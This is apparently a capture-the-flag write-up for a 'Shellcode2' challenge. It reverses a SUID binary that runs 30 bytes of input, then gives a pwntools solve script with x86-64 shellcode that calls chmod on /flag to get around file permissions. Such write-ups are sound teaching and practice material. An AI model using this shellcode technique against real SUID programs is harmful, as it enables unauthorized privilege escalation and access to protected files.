# Shellcode2

Author: `misi`

---
In this challenge we are given a shell. The flag file is located at /flag, and the challenge binary is in /challenge.  
By running ls -la with /flag and /challenge/shellcode as arguments, we can see the privelieges of each file.  

<img width="559" height="146" alt="3" src="https://github.com/user-attachments/assets/d36eaa9a-17c0-4a65-972c-232c6013865d" />

Both /flag and /challenge/shellcode is owned by an 'owner' user.    
Our current user (`ctf`) does not have permission to open the flag.  
The binary /challenge/shellcode has the SUID bit set, which means it runs with the priveliges of its owner (`owner`). This allows us to potentially use it to open /flag.

### Reversing
Start by doing a checksec on the given binary to see what security features is enabled.

<img width="613" height="139" alt="1" src="https://github.com/user-attachments/assets/f13dfd82-4c91-43fa-81cb-cb07acaf3585" />

- PIE is enabled
- There is no stack canary found
- The binary is not stripped
- NX enabled

I use ghidra to decompile the given binary  
main() is the only function we need to reverse.  

<img width="751" height="783" alt="2" src="https://github.com/user-attachments/assets/4047d89e-60b3-4dbb-8abf-90a70cec4de0" />

main() will print out some information, do a mmap, making some memory region executable, and then read in 0x1e (30 in decimal) bytes into the memory region. Finally it will execute the input you sent in, before it returns.


### Exploitation
Since the shellcode can at most be 30 bytes long, it will not be possible to open and read the flag with shellcode.  
There are possibly multiple ways to solve this challenge, in this writeup I will change the permissions on the /flag file, to be able to read it as the `ctf` user.  
To do this you can use the chmod syscall, as it is only one syscall, we will be able to use less bytes for the shellcode.  
After running the shellcode, you can do `cat /flag` to print the flag to the terminal.  

Here is the final solve script:  
```py
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

p = process("/challenge/shellcode")
asm_code = asm("""
               xor rax, rax
               add al, 90
               lea rdi, [rip+flag]
               mov si, 0755
               syscall
               flag:
               .string "/flag"
               """)

p.recvuntil("shellcode: ")
p.sendline(asm_code)
p.interactive()
```
